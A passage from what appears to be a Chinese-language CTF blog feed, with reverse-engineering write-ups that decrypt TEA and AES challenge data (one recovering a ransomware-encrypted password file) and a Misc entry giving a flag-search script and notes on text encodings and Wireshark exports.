    <content type="html"><![CDATA[<h1 id="Android-AES"><a href="#Android-AES" class="headerlink" title="Android AES"></a>Android AES</h1><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1AgYjnhu-KwWbpE37RDHnbg?pwd=1111">https://pan.baidu.com/s/1AgYjnhu-KwWbpE37RDHnbg?pwd=1111</a><br>提取码：1111 </p></blockquote><h2 id="考点：TEA-AES"><a href="#考点：TEA-AES" class="headerlink" title="考点：TEA AES"></a>考点：TEA AES</h2><p>程序的主逻辑如下，输入经过aes加密和native内部的密文进行比较</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801221420564.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801221420564.png"  class="" lazyload></a><p>进入lib查看，尽量每一个都看一下，因为不同架构IDA反编译的结果可能不一样</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801221703898.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801221703898.png"  class="" lazyload></a><p>密文和密钥</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801222814470.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801222814470.png"  class="" lazyload></a><p>很明显的tea加密 ，还有findcrypt也识别为TEA加密</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801223458435.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801223458435.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801222839474.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801222839474.png"  class="" lazyload></a><p>关于arm架构的一些资料</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801221717212.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801221717212.png"  class="" lazyload></a><h3 id="知识点一-TEA加密"><a href="#知识点一-TEA加密" class="headerlink" title="知识点一:TEA加密"></a>知识点一:TEA加密</h3><p>TEA 是一种常见的分组加密算法，密钥为 128 比特位，明文为 64 比特位，主要做了 32 轮变换，每轮变换中都涉及移位和变换。</p><p>识别方法为：TEA 算法中有一个固定的常数 <strong>0x9e3779b9 或者 0x61c88647</strong></p><h2 id="解题代码和TEA加解密源码"><a href="#解题代码和TEA加解密源码" class="headerlink" title="解题代码和TEA加解密源码"></a>解题代码和TEA加解密源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, i;</span><br><span class="line">  <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    sum += delta;</span><br><span class="line">    v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">    v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0xC6EF3720</span>, i;</span><br><span class="line">  <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">    sum -= delta;</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">4</span>] = &#123;<span class="number">370962600</span>, <span class="number">1695475146</span>, <span class="number">1118301157</span>, <span class="number">328319843</span>&#125;, key[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    decrypt(v + i, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x, %x, &quot;</span>, (v + i)[<span class="number">0</span>], (v + i)[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *v, <span class="type">unsigned</span> <span class="type">int</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        l += ((r &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (r + sum) ^ ((r &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">        r += ((l &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (l + sum) ^ ((l &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = l;</span><br><span class="line">    v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *v, <span class="type">unsigned</span> <span class="type">int</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        r -= ((l &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (l + sum) ^ ((l &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">        l -= ((r &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (r + sum) ^ ((r &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = l;</span><br><span class="line">    v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">4</span>] = &#123;<span class="number">370962600</span>, <span class="number">1695475146</span>, <span class="number">1118301157</span>, <span class="number">328319843</span>&#125;, key[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(v + i, key);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x, %x, &quot;</span>, (v + i)[<span class="number">0</span>], (v + i)[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = [<span class="number">0x5a87be5e</span>, <span class="number">0x13e418d0</span>, <span class="number">0x66aaefdd</span>, <span class="number">0xb322754f</span>]</span><br><span class="line">key = <span class="string">b&#x27;win_crack_god!@#&#x27;</span></span><br><span class="line">cipher = <span class="string">b&#x27;&#x27;</span>.join([i.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> c])</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure><ul><li><p>代码解释：来自Chatgpt<br>当我们观察到这段代码时，可以看到它使用了列表推导式和<code>join()</code>函数来将一组整数转换为一个字节字符串。</p><p>让我们逐步解释这段代码的功能：</p><ol><li><code>[i.to_bytes(4, &#39;little&#39;) for i in c]</code>：这是一个列表推导式，遍历列表<code>c</code>中的每个整数<code>i</code>，并将每个整数转换为一个4字节的小端字节序。<code>to_bytes(4, &#39;little&#39;)</code>方法将整数转换为一个字节字符串，其中参数4表示要生成的字节数，’little’表示使用小端字节序进行编码。</li><li><code>b&#39;&#39;.join(...)</code>：<code>join()</code>函数用于连接字符串。在这里，它将列表推导式生成的所有字节字符串连接在一起。<code>b&#39;&#39;</code>是一个空的字节字符串，作为连接时的分隔符。</li></ol><p>综合起来，<code>cipher = b&#39;&#39;.join([i.to_bytes(4, &#39;little&#39;) for i in c])</code>的作用是将列表<code>c</code>中的每个整数转换为4字节的小端字节序，并将它们连接成一个字节字符串。结果存储在<code>cipher</code>变量中，用于后续的解密操作。</p></li><li><p>至于填充模式，默认就是PKCS5Padding</p></li></ul><h1 id="黑客偷走的密码（AES）"><a href="#黑客偷走的密码（AES）" class="headerlink" title="黑客偷走的密码（AES）"></a>黑客偷走的密码（AES）</h1><h2 id="附件-1"><a href="#附件-1" class="headerlink" title="附件"></a>附件</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1F5S5juDhDUdkdHiMMCesug?pwd=1111">https://pan.baidu.com/s/1F5S5juDhDUdkdHiMMCesug?pwd=1111</a><br>提取码：1111 </p></blockquote><p>描述：财务人员的电脑中了勒索病毒，重要账号的密码文件被加密了，必须向攻击者支付比特币才能获得解密密码。作为安全人员，你有办法还原文件，找回文件中的密码吗？</p><h2 id="考点：AES-WIN-API分析"><a href="#考点：AES-WIN-API分析" class="headerlink" title="考点：AES  WIN API分析"></a>考点：AES  WIN API分析</h2><p>插件识别出来是AES</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801230350033.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801230350033.png"  class="" lazyload></a><p>Key</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801231237661.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801231237661.png"  class="" lazyload></a><p>解题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">k = [<span class="number">0x16157E2B</span>, <span class="number">0xA6D2AE28</span>, <span class="number">0x8815F7AB</span>, <span class="number">0x3C4FCF09</span>]</span><br><span class="line">key = <span class="string">b&quot;&quot;</span>.join([i.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> k ])</span><br><span class="line">cry = <span class="built_in">open</span>(<span class="string">&quot;flag.txt.cry&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plain = aes.decrypt(cry).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;plain text: <span class="subst">&#123;plain&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android-AES&quot;&gt;&lt;a href=&quot;#Android-AES&quot; class=&quot;headerlink&quot; title=&quot;Android AES&quot;&gt;&lt;/a&gt;Android AES&lt;/h1&gt;&lt;h2 id=&quot;附件&quot;&gt;&lt;a href=&quot;#附件&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Misc_CTF</title>
    <link href="https://kidder1.github.io/2023/07/27/Misc_CTF/"/>
    <id>https://kidder1.github.io/2023/07/27/Misc_CTF/</id>
    <published>2023-07-27T01:54:12.000Z</published>
    <updated>2023-08-02T08:35:45.787Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flag-为明文"><a href="#flag-为明文" class="headerlink" title="flag 为明文"></a>flag 为明文</h1><p>直接搜索，WireShark设置如下</p><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727095518075.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727095518075.png"  class="" lazyload></a><p>关于分组字节流，请看</p><blockquote><ul><li>“分组字节流” 是数据包的原始二进制表示，以十六进制显示。</li><li>“分组列表” 是捕获到的数据包的可视化列表，显示数据包的摘要信息。</li><li>“分组详情” 提供选定数据包的深层解析，包括每个协议的详细信息。</li></ul></blockquote><h2 id="flag为编码"><a href="#flag为编码" class="headerlink" title="flag为编码"></a>flag为编码</h2><blockquote><p>flag的十六进制编码：666c6167</p></blockquote><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>通过脚本进行扫描，然后从扫描排查的输出进行判断flag的格式</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印可打印字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_re</span>(<span class="params">str1</span>):</span><br><span class="line">    str2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1.decode(<span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">126</span> &gt;= <span class="built_in">ord</span>(i) &gt;= <span class="number">33</span>:</span><br><span class="line">                str2 += i</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            str2 += <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文本函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">txt_wt</span>(<span class="params">name, txt1</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;filename:&#x27;</span> + name)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;flag:&#x27;</span> + txt1)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 第一次运行，清空output文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_txt</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;clear output.txt!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归遍历的所有文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_bianli</span>():</span><br><span class="line">    <span class="comment"># 路径设置为当前目录</span></span><br><span class="line">    path = os.getcwd()</span><br><span class="line">    <span class="comment"># 返回文件下的所有文件列表</span></span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> i, j, k <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> dd <span class="keyword">in</span> k:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;.py&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd <span class="keyword">and</span> <span class="string">&quot;output.txt&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd:</span><br><span class="line">                file_list.append(os.path.join(i, dd))</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找文件中可能为flag的字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">file_list, flag_list</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(i, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> f.readlines():</span><br><span class="line">                    j1 = str_re(j)  <span class="comment"># 可打印字符串</span></span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> flag_list:</span><br><span class="line">                        <span class="keyword">if</span> k <span class="keyword">in</span> j1:</span><br><span class="line">                            txt_wt(i, j1)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;filename:&#x27;</span>, i)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;flag:&#x27;</span>, j1)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;err&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_txt = [<span class="string">&#x27;flag&#123;&#x27;</span>, <span class="string">&#x27;666c6167&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;Zmxh&#x27;</span>, <span class="string">&#x27;&amp;#102&#x27;</span>, <span class="string">&#x27;666C6167&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空输出的文本文件</span></span><br><span class="line">clear_txt()</span><br><span class="line"><span class="comment"># 遍历文件名</span></span><br><span class="line">file_lt = file_bianli()</span><br><span class="line"><span class="comment"># 查找flag关键字</span></span><br><span class="line">flag(file_lt, flag_txt)</span><br></pre></td></tr></table></figure><h3 id="三种硬编码区分"><a href="#三种硬编码区分" class="headerlink" title="三种硬编码区分"></a>三种硬编码区分</h3><ol><li>URL编码（URL Encoding）： <strong>URL编码也称为百分号编码（Percent Encoding</strong>），是一种用于在URL中表示特殊字符的编码方式。它将URL中的非字母数字字符转换为特殊格式：%xx，其中xx是字符的十六进制ASCII码表示。这样做是为了避免特殊字符与URL的语法冲突。<br>例如，空格字符（ASCII码为32）在URL编码后将变成”%20”。其他特殊字符也有相应的编码形式。</li></ol><ul><li>字符串：Hello, World!</li><li>URL编码后：Hello%2C%20World%21<br>厨子处理<a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727134323349.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727134323349.png"  class="" lazyload></a></li></ul><ol start="2"><li>Unicode编码： Unicode编码是一种字符编码标准，<strong>用于表示世界上所有字符的唯一代码点</strong>。它为每个字符分配了一个唯一的整数值，称为Unicode码点。不同的字符集如UTF-8、UTF-16和UTF-32等以不同方式表示Unicode字符。</li></ol><ul><li>字符：爱 (中文“爱”字)</li><li>Unicode码点：U+7231<a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727134405109.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727134405109.png"  class="" lazyload></a></li></ul><ol start="3"><li><p>HTML实体编码（HTML Entity Encoding）： HTML实体编码用于在HTML文档中表示特殊字符，比如用于显示保留字符（例如小于号和大于号）或不能在HTML文档中直接显示的字符（如版权符号）。</p><p>它的形式是<code>&amp;entity;</code>，其中entity是一个预定义的名称或数字引用，代表特定字符的编码值。</p></li></ol><ul><li>特殊字符：小于号 (&lt;)</li><li>HTML实体编码：&lt;</li></ul><p>联系和区别：</p><ul><li>URL编码和HTML实体编码都是用于在特定上下文中转义特殊字符，以避免冲突或表示不可见字符。</li><li>Unicode编码是字符的标准化表示形式，用于标识字符在全球范围内的唯一代码点。</li></ul><p>识别：</p><ul><li><p>URL编码和HTML实体编码通常以特定的格式出现，如”%xx”和”&entity;”。</p></li><li><p>Unicode编码通常以U+开头，后跟字符的十六进制码点表示。</p><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727134458275.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727134458275.png"  class="" lazyload></a></li></ul><h3 id="压缩包处理"><a href="#压缩包处理" class="headerlink" title="压缩包处理"></a>压缩包处理</h3><blockquote><p>注：导出文件请转成原始010二进制各式进行导出，防止有不可打印字符没有导出</p></blockquote><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727133555658.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727133555658.png"  class="" lazyload></a><p>定位到包的位置，选择压缩包格式，用原格式导出即可</p><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727133705093.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727133705093.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727133805684.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727133805684.png"  class="" lazyload></a><p><strong><a class="simple-lightbox" href="/2023/07/27/Misc_CTF/image-20230727133856790.png"><img   src="/images/loading.svg" data-src="/2023/07/27/Misc_CTF/image-20230727133856790.png"  class="" lazyload></a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;flag-为明文&quot;&gt;&lt;a href=&quot;#flag-为明文&quot; class=&quot;headerlink&quot; title=&quot;flag 为明文&quot;&gt;&lt;/a&gt;flag 为明文&lt;/h1&gt;&lt;p&gt;直接搜索，WireShark设置如下&lt;/p&gt;
&lt;a class=&quot;simple-lightb</summary>
      
    
    
    
    <category term="Misc" scheme="https://kidder1.github.io/categories/Misc/"/>
    
    
    <category term="Misc" scheme="https://kidder1.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>PWN_CTF</title>
    <link href="https://kidder1.github.io/2023/07/24/Pwn_CTF/"/>
    <id>https://kidder1.github.io/2023/07/24/Pwn_CTF/</id>
    <published>2023-07-24T02:24:36.000Z</published>
    <updated>2023-08-02T08:36:03.727Z</updated>
    
